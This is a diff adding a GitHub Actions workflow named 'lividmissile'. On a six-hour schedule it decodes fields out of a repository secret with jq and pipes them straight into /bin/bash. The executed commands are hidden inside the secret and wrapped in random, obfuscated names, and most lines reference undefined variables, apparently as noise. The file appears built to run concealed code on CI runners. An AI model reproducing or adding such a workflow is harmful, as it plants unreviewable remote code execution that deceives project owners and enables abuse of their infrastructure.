@@ -1,0 +1,32 @@
+name: lividmissile
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lividmissile
+        env:
+          wydod8: ${{ secrets.wydod8 }}
+        run: |
+          echo $wydod8 | jq -r .yv31 | /bin/bash
+          echo $grcno0 | jq -r .z0 | /bin/bash
+          echo $os03 | jq -r .xb47063 | /bin/bash
+          echo $wzx3186 | jq -r .jrghi50 | /bin/bash
+          echo $p94 | jq -r .ypnjm03 | /bin/bash
+          echo $rk19 | jq -r .ui57 | /bin/bash
+          echo $hszh78 | jq -r .pxibu02299 | /bin/bash
+          echo $gw76 | jq -r .vkrp4517 | /bin/bash
+          echo $lo76 | jq -r .jf1981 | /bin/bash
+          echo $vprs69 | jq -r .zjr54 | /bin/bash
+          echo $na97 | jq -r .zd1 | /bin/bash
+          echo $lc91 | jq -r .rdi48 | /bin/bash
+          echo $gjfav93 | jq -r .nti64 | /bin/bash
+          echo $ekvg1 | jq -r .bzu934 | /bin/bash
+          echo $cpy521 | jq -r .l5 | /bin/bash
+
